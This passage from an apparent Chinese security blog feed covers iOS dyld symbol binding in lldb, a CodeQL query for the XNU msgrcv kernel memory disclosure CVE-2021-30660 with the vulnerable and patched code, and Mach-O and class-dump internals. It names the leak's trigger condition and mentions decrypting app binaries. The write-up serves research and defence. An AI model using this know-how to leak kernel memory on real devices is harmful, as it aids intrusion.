class="keyword">long</span>, <span class="keyword">char</span> <span class="keyword">const</span>*, <span class="keyword">char</span> <span class="keyword">const</span>*, <span class="keyword">char</span> <span class="keyword">const</span>*, ImageLoaderMachO::ExtraBindData*, <span class="keyword">unsigned</span> <span class="keyword">long</span>)</span><br><span class="line">    <span class="number">0x100fe5f2c</span> &lt;+<span class="number">328</span>&gt;: ldrb   w8, [sp, #<span class="number">0x27</span>]</span><br><span class="line">    <span class="number">0x100fe5f30</span> &lt;+<span class="number">332</span>&gt;: ldrb   w9, [x21, #<span class="number">0x139</span>]</span><br><span class="line">    <span class="number">0x100fe5f34</span> &lt;+<span class="number">336</span>&gt;: orr    w8, w8, w9</span><br><span class="line">Target <span class="number">0</span>: (main) stopped.</span><br><span class="line">(lldb) re re x0</span><br><span class="line">      x0 = <span class="number">0x00000001010235e0</span>  dyld::gLinkContext</span><br><span class="line">(lldb) re re x1</span><br><span class="line">      x1 = <span class="number">0x0000000100000000</span></span><br><span class="line">(lldb) re re x2</span><br><span class="line">      x2 = <span class="number">0x0000000100fb8020</span>  (<span class="keyword">void</span> *)<span class="number">0x0000000100fb7f98</span></span><br><span class="line">(lldb) re re x3</span><br><span class="line">      x3 = <span class="number">0x00000001d860e14c</span>  libsystem_c.dylib`<span class="built_in">printf</span></span><br><span class="line">(lldb) re re x4</span><br><span class="line">      x4 = <span class="number">0x0000000000000001</span></span><br><span class="line">(lldb) re re x5</span><br><span class="line">      x5 = <span class="number">0x0000000100fbc04e</span></span><br><span class="line">(lldb) re re x6</span><br><span class="line">      x6 = <span class="number">0x0000000000000000</span></span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure><p>执行之后:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(lldb) n</span><br><span class="line"><span class="built_in">Process</span> <span class="number">1465</span> stopped</span><br><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over</span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x0000000100fe5f2c</span> dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(<span class="keyword">unsigned</span> <span class="keyword">int</span>, ImageLoader::LinkContext <span class="keyword">const</span>&amp;, <span class="keyword">void</span> (*)(), <span class="keyword">void</span> (*)()) + <span class="number">328</span></span><br><span class="line">dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:</span><br><span class="line">-&gt;  <span class="number">0x100fe5f2c</span> &lt;+<span class="number">328</span>&gt;: ldrb   w8, [sp, #<span class="number">0x27</span>]</span><br><span class="line">    <span class="number">0x100fe5f30</span> &lt;+<span class="number">332</span>&gt;: ldrb   w9, [x21, #<span class="number">0x139</span>]</span><br><span class="line">    <span class="number">0x100fe5f34</span> &lt;+<span class="number">336</span>&gt;: orr    w8, w8, w9</span><br><span class="line">    <span class="number">0x100fe5f38</span> &lt;+<span class="number">340</span>&gt;: cbz    w8, <span class="number">0x100fe5e4c</span>           ; &lt;+<span class="number">104</span>&gt;</span><br><span class="line">Target <span class="number">0</span>: (main) stopped.</span><br><span class="line">(lldb) x/gx <span class="number">0x0000000100fb8020</span></span><br><span class="line"><span class="number">0x100fb8020</span>: <span class="number">0x00000001d860e14c</span></span><br><span class="line">(lldb) <span class="built_in">image</span> lookup -va <span class="number">0x00000001d860e14c</span></span><br><span class="line">      Address: libsystem_c.dylib[<span class="number">0x00000001809a614c</span>] (libsystem_c.dylib.__TEXT.__text + <span class="number">263364</span>)</span><br><span class="line">      Summary: libsystem_c.dylib`<span class="built_in">printf</span></span><br><span class="line">       Module: file = <span class="string">"/Users/muhe/Library/Developer/Xcode/iOS DeviceSupport/12.2 (16E227)/Symbols/usr/lib/system/libsystem_c.dylib"</span>, arch = <span class="string">"arm64"</span></span><br><span class="line">       Symbol: id = &#123;<span class="number">0x00000617</span>&#125;, range = [<span class="number">0x00000001d860e14c</span><span class="number">-0x00000001d860e1a8</span>), name=<span class="string">"printf"</span></span><br></pre></td></tr></table></figure><p>可以看到符号地址已经被写过去了(0x0000000100fb8020)</p><p>至此，符号绑定过程完成。</p><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p>《程序员的自我修养-链接、装载和库》</p><p><a href="https://juejin.cn/post/6844903912147795982">https://juejin.cn/post/6844903912147795982</a></p><p><a href="https://juejin.cn/post/6844903922654511112#heading-10">https://juejin.cn/post/6844903922654511112#heading-10</a></p><p><a href="https://bbs.pediy.com/thread-263907.htm">https://bbs.pediy.com/thread-263907.htm</a></p><p><a href="https://iosre.com/t/ios-12-4-killed-9/15633">https://iosre.com/t/ios-12-4-killed-9/15633</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ENV&quot;&gt;&lt;a href=&quot;#ENV&quot; class=&quot;headerlink&quot; title=&quot;ENV&quot;&gt;&lt;/a&gt;ENV&lt;/h1&gt;&lt;p&gt;macos11.4 + iphone6 iOS 12.2&lt;/p&gt;</summary>
    
    
    
    <category term="iOS" scheme="http://o0xmuhe.me/categories/iOS/"/>
    
    
    <category term="RE" scheme="http://o0xmuhe.me/tags/RE/"/>
    
    <category term="iOS" scheme="http://o0xmuhe.me/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>ql query for CVE-2021-30660 XNU Kernel Memory Disclosure</title>
    <link href="http://o0xmuhe.me/2021/07/11/ql-query-for-CVE-2021-30660-XNU-Kernel-Memory-Disclosure/"/>
    <id>http://o0xmuhe.me/2021/07/11/ql-query-for-CVE-2021-30660-XNU-Kernel-Memory-Disclosure/</id>
    <published>2021-07-11T08:22:50.000Z</published>
    <updated>2021-07-11T08:29:13.743Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://alexplaskett.github.io/CVE-2021-30660/">CVE-2021-30660 - XNU Kernel Memory Disclosure</a></p><a id="more"></a><h1 id="Vuln"><a href="#Vuln" class="headerlink" title="Vuln"></a>Vuln</h1><p><code>msgsz</code> 可控</p><p><code>msginfo.msgssz</code> 是 8</p><p>如果控制<code> msgsz</code> 不是 8的 整数倍，比如9，就会导致在第二次循环的时候 leak出来 7字节的内核数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">next = msghdr-&gt;msg_spot;</span><br><span class="line">    <span class="keyword">for</span> (len = <span class="number">0</span>; len &lt; msgsz; len += msginfo.msgssz) &#123;</span><br><span class="line">        <span class="keyword">size_t</span> tlen;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* compare input (size_t) value against restrict (int) value */</span></span><br><span class="line">        <span class="keyword">if</span> (msgsz &gt; (<span class="keyword">size_t</span>)msginfo.msgssz) &#123;</span><br><span class="line">            tlen = msginfo.msgssz;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tlen = msgsz;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (next &lt;= <span class="number">-1</span>) &#123;</span><br><span class="line">            panic(<span class="string">"next too low #3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (next &gt;= msginfo.msgseg) &#123;</span><br><span class="line">            panic(<span class="string">"next out of range #3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        SYSV_MSG_SUBSYS_UNLOCK();</span><br><span class="line">        eval = copyout(&amp;msgpool[next * msginfo.msgssz],</span><br><span class="line">            user_msgp, tlen);</span><br><span class="line">        SYSV_MSG_SUBSYS_LOCK();</span><br><span class="line">        <span class="keyword">if</span> (eval != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> MSG_DEBUG_OK</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"error (%d) copying out message segment\\n"</span>,</span><br><span class="line">                eval);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            msg_freehdr(msghdr);</span><br><span class="line">            wakeup((<span class="keyword">caddr_t</span>)msqptr);</span><br><span class="line">            <span class="keyword">goto</span> msgrcvout;</span><br><span class="line">        &#125;</span><br><span class="line">        user_msgp = user_msgp + tlen;   <span class="comment">/* ptr math */</span></span><br><span class="line">        next = msgmaps[next].next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (len = <span class="number">0</span>; len &lt; msgsz; len += msginfo.msgssz) &#123;</span><br><span class="line">        <span class="keyword">size_t</span> tlen;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * copy the full segment, or less if we're at the end</span></span><br><span class="line"><span class="comment">         * of the message</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        tlen = MIN(msgsz - len, (<span class="keyword">size_t</span>)msginfo.msgssz);</span><br><span class="line">        <span class="keyword">if</span> (next &lt;= <span class="number">-1</span>) &#123;</span><br><span class="line">            panic(<span class="string">"next too low #3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (next &gt;= msginfo.msgseg) &#123;</span><br><span class="line">            panic(<span class="string">"next out of range #3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        SYSV_MSG_SUBSYS_UNLOCK();</span><br><span class="line">        eval = copyout(&amp;msgpool[next * msginfo.msgssz],</span><br><span class="line">            user_msgp, tlen);</span><br></pre></td></tr></table></figure><p>补丁保证了，在非8 整数倍的时候，只拷贝剩余的长度的数据。</p><h1 id="CodeQL-query"><a href="#CodeQL-query" class="headerlink" title="CodeQL query"></a>CodeQL query</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">// 存在误报 IOKit</span><br><span class="line">predicate isSYSCall(Function f) &#123;</span><br><span class="line">    exists(Macro m |</span><br><span class="line">        m.getName().toUpperCase().regexpMatch("SYS(.)*") and</span><br><span class="line">        m.getLocation().getFile().getBaseName() = "syscall.h" and </span><br><span class="line">        m.getName().indexOf(f.getName()) &gt; 0</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">syscall -&gt; copyout</span></span><br><span class="line"><span class="comment">source : syscall fucntion 's params</span></span><br><span class="line"><span class="comment">sink   : copyout 3rd param(size)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">class Config extends TaintTracking::Configuration &#123;</span><br><span class="line">  Config() &#123; this = "taint size to copy size" &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    exists(LocalVariable lv, Function f |</span><br><span class="line">        isSYSCall(f) and</span><br><span class="line">        lv.getFunction() = f and</span><br><span class="line">        (</span><br><span class="line">            not source.asExpr().(Literal).isConstant()</span><br><span class="line">        ) and</span><br><span class="line">        lv.getAnAccess() = source.asExpr()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists (FunctionCall fc | </span><br><span class="line">            fc.getTarget().getName() = "copyout" and</span><br><span class="line">            fc.getArgument(2) = sink.asExpr()</span><br><span class="line">        )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where cfg.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">source</span>, <span class="string">" to "</span>, sink, <span class="string">" in "</span>, source.getNode().getFunction().getName()</span><br></pre></td></tr></table></figure><p>有误报，但是够用了，替换成copyin，也可以看看其他的调用路径，不过笔者没发现什么有价值的东西 : (</p><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p>CVE-2021-30660 - XNU Kernel Memory Disclosure</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://alexplaskett.github.io/CVE-2021-30660/&quot;&gt;CVE-2021-30660 - XNU Kernel Memory Disclosure&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="XNU" scheme="http://o0xmuhe.me/categories/XNU/"/>
    
    
    <category term="XNU" scheme="http://o0xmuhe.me/tags/XNU/"/>
    
    <category term="CodeQL" scheme="http://o0xmuhe.me/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>iOS RE 4 beginners 1 - MachO &amp;&amp; class-dump</title>
    <link href="http://o0xmuhe.me/2021/07/11/iOS-RE-4-beginners-1/"/>
    <id>http://o0xmuhe.me/2021/07/11/iOS-RE-4-beginners-1/</id>
    <published>2021-07-11T06:48:13.000Z</published>
    <updated>2021-08-01T14:38:49.733Z</updated>
    
    <content type="html"><![CDATA[<h1 id="roadmap"><a href="#roadmap" class="headerlink" title="roadmap"></a>roadmap</h1><p>之前在 <a href="https://iosre.com/">iosre</a>看到一张比较系统的iOS逆向学习路线图，因为接触过一段时间macOS上服务的漏洞挖掘，所以对*OS安全还是挺有兴趣的，也一直想系统性地学习下iOS逆向，之前的一直不成体系，也很零碎，正好对着这个图重构下知识体系。</p><span id="more"></span><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/ios_re.png" alt="ios_re"></p><h1 id="macho-file-format"><a href="#macho-file-format" class="headerlink" title="macho file format"></a>macho file format</h1><p>  类似Windows/Linux平台逆向学习，首先要学习正向开发的基础知识，以及涉及的文件格式(指可执行文件)：</p><ul><li>Windows - PE</li><li>Linux - ELF</li><li>*OS - MachO</li></ul><p>根据roadmap中的app分析流程，第一步就是“砸壳“，就是在根据文件格式做文章，因为macho文件是加密的，被加载到内存执行的时候才会解密，所以我们做静态分析，需要把内存中解密之后的可执行文件dump出来，并修复文件才可以拖入hopper/IDA正常分析。</p><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/iosre1/macho_overview.png" alt="Untitled"></p><p>我感觉这些可执行文件大同小异的味道，基本都是文件头+各种节区。 在macOS上你可以使用：</p><ul><li>MachOView</li><li>MachOExplorer</li></ul><p>来查看一个macho文件的结构，推荐前者，后者不知道为什么总是卡卡的，而且很容易崩溃 :(</p><p> 总体上来看，macho文件格式可以看做：</p><ul><li><p>Header</p></li><li><p>Load Commands</p><ul><li>LC_SEGMENT<ul><li>TEXT</li><li>DATA</li><li>LINKEDIT</li></ul></li><li>LC_CODESIGNATURE</li><li>LC_DYLD_INFO_ONLY</li><li>LC_XXXX_DYLIB</li></ul></li><li><p>Data</p><ul><li>Segment(1-n)</li></ul></li></ul><h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><p>只关注几个基本字段</p><ul><li>magic number : 表示macho的类型，FAT, ARMv7,ARM64,x86_64<ul><li>FAT 就是 “胖文件”，表示这个文件里包含了多个架构的MachO文件，可以使用<code>lipo</code>分离</li></ul></li><li>CPU Type, CPU SubType : arch</li><li>Number of load commands : Load commands的数量</li><li>flags：表示一些标识位，比如是否开了PIE，checksec可以从这里获取一些信息。</li><li>reversed：64位保留字段</li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.09.41@2x.png" alt="CleanShot 2021-07-11 at 15.09.41@2x"></p><h2 id="Load-Commands"><a href="#Load-Commands" class="headerlink" title="Load Commands"></a>Load Commands</h2><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.17.40@2x.png" alt="CleanShot 2021-07-11 at 15.17.40@2x"></p><p>即告诉操作系统，该如何加载文件中的数据。</p><ul><li><strong>LC_SEGMENT_64</strong>：定义一个段，加载后被映射到内存中，包括里面的节。 比如代码段 数据段 :<ul><li>TEXT 代码段</li><li>DATA 数据段</li></ul></li><li>LC_DYLD_INFO_ONLY：记录了有关链接的重要信息，包括在_LINKEDIT中动态链接 相关信息的具体偏移和大小。ONLY表示这个加载指令是程序运行所必需的，如果旧的 链接器无法识别它，程序就会出错。</li><li><strong>LC_SYMTAB</strong>：为文件定义符号表和字符串表，在链接文件时被链接器使用，同时也用于调试器映射符号到源文件。符号表定义的本地符号仅用于调试，而已定义和未定义的external符号被链接器使用。</li><li>LC_DYSYMTAB:将符号表中给出符号的额外符号信息提供给动态链接器。</li><li><strong>LC_LOAD_DYLINKER</strong>：默认的加载器路径。 <code>/usr/lib/dyld</code></li><li>LC_UUID：用于标识MachO文件的ID，也用于崩溃堆栈和符号文件的对应解析。</li><li>LC_VERSION_MIN_IPHONEOS：系统要求的最低版本。</li><li>LC_SOURCE_VERSION：构建二进制文件的源代码版本号。</li><li>LC_MAIN：程序的入口。dyld获取该地址，然后跳转到该处执行。</li><li><strong>LC_ENCRYPTION_INFO_64</strong>：文件是否加密的标志，加密内容的偏移和大小。<ul><li>lldb dump 砸壳修复文件之后，需要修改该标识位以确保正常反汇编文件。</li></ul></li><li>LC_LOAD_DYLIB:依赖的动态库，包括动态库名称、当前版本号、兼容版本号。<ul><li>“otool -L xxx”命令查看</li></ul></li><li>LC_RPATH： Runpath Search Paths, @rpath 搜索的路径。</li><li>LC_FUNCTION_STARTS：函数起始地址表，使调试器和其他程序能很容易地看到一个地址是否在函数内。</li><li>LC_DATA_IN_CODE：定义在代码段内的非指令的表。</li><li><strong>LC_CODE_SIGNATURE</strong>：代码签名信息。<ul><li>codesign -d [filename]</li></ul></li></ul><h2 id="Data-Segments"><a href="#Data-Segments" class="headerlink" title="Data-Segments"></a>Data-Segments</h2><p>各种节区，比如代码段，数据段，只读数据段等：</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.19.59@2x.png" alt="CleanShot 2021-07-11 at 15.19.59@2x"></p><p>这里可以看到很多<code>__DATA, __objc__?</code> 节区，<code>Symbol Table</code> <code>String Table</code>也单独列了出来。</p><ul><li>__objc_protolist</li><li>__objc_classlist</li><li>__objc_catlist section</li><li>…</li></ul><p>这些节区保存了OC中类名，函数名等信息，这就为从MachO中dump出来头文件打下了基础。</p><h2 id="Get-class-info-from-macho-file"><a href="#Get-class-info-from-macho-file" class="headerlink" title="Get class info from macho file"></a>Get class info from macho file</h2><p><code>__DATA, __objc_protolist</code>节区：</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.30.45@2x.png" alt="CleanShot 2021-07-11 at 15.30.45@2x"></p><p>存储的都是指针，指向一个又一个protocol的结构，可以参考objc的代码 : </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">protocol_t</span> :</span> objc_object &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *mangledName;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">protocol_list_t</span> *<span class="title">protocols</span>;</span></span><br><span class="line">    <span class="keyword">method_list_t</span> *instanceMethods;</span><br><span class="line">    <span class="keyword">method_list_t</span> *classMethods;</span><br><span class="line">    <span class="keyword">method_list_t</span> *optionalInstanceMethods;</span><br><span class="line">    <span class="keyword">method_list_t</span> *optionalClassMethods;</span><br><span class="line">    <span class="keyword">property_list_t</span> *instanceProperties;</span><br><span class="line">    <span class="keyword">uint32_t</span> size;   <span class="comment">// sizeof(protocol_t)</span></span><br><span class="line">    <span class="keyword">uint32_t</span> flags;</span><br><span class="line">    <span class="comment">// Fields below this point are not always present on disk.</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> **_extendedMethodTypes;</span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">objc_object</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">isa_t</span> isa;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们可以按照结构体索引 <code>__DATA, __objc_protolist</code> 里指针指向的位置的数据，就可以解析出来protocol的类型，名字，方法等信息。</p><h1 id="class-dump-read-notes"><a href="#class-dump-read-notes" class="headerlink" title="class-dump read notes"></a>class-dump read notes</h1><h2 id="env"><a href="#env" class="headerlink" title="env"></a>env</h2><p>macos11.4 + xcode12</p><h2 id="compile"><a href="#compile" class="headerlink" title="compile"></a>compile</h2><p>Q : <code>openssl/aes.h</code> not found</p><p>A :  add header file path</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export LDFLAGS=<span class="string">&quot;-L/usr/local/opt/openssl/lib&quot;</span></span><br><span class="line">export CPPFLAGS=<span class="string">&quot;-I/usr/local/opt/openssl/include&quot;</span></span><br></pre></td></tr></table></figure><p>XCode中的配置是:</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/111.png" alt="111"></p><p>Q : Library not found for -lcrypto</p><p>A :  add the missing dylib</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/fix_crypto.png" alt="fix_crypto"></p><h2 id="raed-amp-amp-debug"><a href="#raed-amp-amp-debug" class="headerlink" title="raed &amp;&amp; debug"></a>raed &amp;&amp; debug</h2><p>核心逻辑就看</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="keyword">void</span>)processObjectiveCData;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (CDMachOFile *machOFile <span class="keyword">in</span> <span class="keyword">self</span>.machOFiles) &#123;</span><br><span class="line">        CDObjectiveCProcessor *processor = [[[machOFile processorClass] alloc] initWithMachOFile:machOFile];</span><br><span class="line">        [processor process];</span><br><span class="line">        [_objcProcessors addObject:processor];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">- (<span class="keyword">void</span>)process;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">self</span>.machOFile.isEncrypted == <span class="literal">NO</span> &amp;&amp; <span class="keyword">self</span>.machOFile.canDecryptAllSegments) &#123;</span><br><span class="line">        [<span class="keyword">self</span>.machOFile.symbolTable loadSymbols];</span><br><span class="line">        [<span class="keyword">self</span>.machOFile.dynamicSymbolTable loadSymbols];</span><br><span class="line"></span><br><span class="line">        [<span class="keyword">self</span> loadProtocols];</span><br><span class="line">        [<span class="keyword">self</span>.protocolUniquer createUniquedProtocols];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Load classes before categories, so we can get a dictionary of classes by address.</span></span><br><span class="line">        [<span class="keyword">self</span> loadClasses];</span><br><span class="line">        [<span class="keyword">self</span> loadCategories];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-symbolTable-loadSymbols"><a href="#1-symbolTable-loadSymbols" class="headerlink" title="1. symbolTable loadSymbols"></a>1. symbolTable loadSymbols</h2><p>Load Commands 里找到 LC_SYMTAB，然后找到 __DATA(依赖属性 RW)。</p><p>然后利用 LC_SYMTAB 初始化了cursor开始遍历找符号。</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.47.33@2x.png" alt="CleanShot 2021-07-11 at 15.47.33@2x"></p><p>strtab 从 string table 开始 ： 一个 symbol起始位置，一个string起始位置。</p><p>然后根据 arm 还是 x64 走不同的逻辑(这里目标是ARM64的Binary) : </p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.48.18@2x.png" alt="CleanShot 2021-07-11 at 15.48.18@2x"></p><p>开始解析 symbol table，item by item</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string table index  --&gt;  在string table里找到对应的 string</span><br><span class="line">type</span><br><span class="line">section index</span><br><span class="line">desc</span><br><span class="line">value</span><br></pre></td></tr></table></figure><p>然后根据string table index里找到对应的string，放到symbols数组里，</p><p>根据 string 的 value 判断是不是 class，这里是根据字符串的开头是不是<code>  @&quot;*OBJC_CLASS*$_&quot;</code>。</p><p>对于解析出来class name，添加到 class symbols dict里，<strong>这样处理之后，symbols， classSymbols都有了。</strong></p><h2 id="2-dynamicSymbolTable-loadsymbols"><a href="#2-dynamicSymbolTable-loadsymbols" class="headerlink" title="2. dynamicSymbolTable loadsymbols"></a>2. dynamicSymbolTable loadsymbols</h2><p>类似1</p><h2 id="3-loadProtocols"><a href="#3-loadProtocols" class="headerlink" title="3. loadProtocols"></a>3. loadProtocols</h2><p>从 <code>__DATA , __objc_protolist</code> 读取 对应的value</p><p>比如得到地址0x1009ccc58</p><p>走到 <code>- (CDOCProtocol *)protocolAtAddress:(uint64_t)address</code></p><p>初始化对应的<code>CDOCProtocol</code>对象</p><p>依赖这个地址，从文件对应地址读取出来 这个 <code>proto</code>的相关信息:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct cd_objc2_protocol objc2Protocol;</span><br><span class="line">objc2Protocol.isa                     = [cursor readPtr];</span><br><span class="line">objc2Protocol.name                    = [cursor readPtr];</span><br><span class="line">objc2Protocol.protocols               = [cursor readPtr];</span><br><span class="line">objc2Protocol.instanceMethods         = [cursor readPtr];</span><br><span class="line">objc2Protocol.classMethods            = [cursor readPtr];</span><br><span class="line">objc2Protocol.optionalInstanceMethods = [cursor readPtr];</span><br><span class="line">objc2Protocol.optionalClassMethods    = [cursor readPtr];</span><br><span class="line">objc2Protocol.instanceProperties      = [cursor readPtr];</span><br><span class="line">objc2Protocol.size                    = [cursor readInt32];</span><br><span class="line">objc2Protocol.flags                   = [cursor 